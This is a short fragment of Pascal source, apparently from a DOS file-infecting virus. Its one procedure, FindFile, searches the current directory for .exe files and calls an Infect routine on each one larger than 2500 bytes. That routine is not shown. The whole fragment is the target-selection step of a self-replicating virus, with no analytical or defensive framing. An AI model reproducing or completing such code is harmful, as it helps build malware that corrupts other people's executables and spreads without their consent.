   procedure FindFile;
   var s:searchrec;
   begin
   findfirst('*.exe',$21,s);
   while doserror=0 do
     begin
     if s.size>2500 then Infect(s.name);
     findnext(s);
     end;
   end;
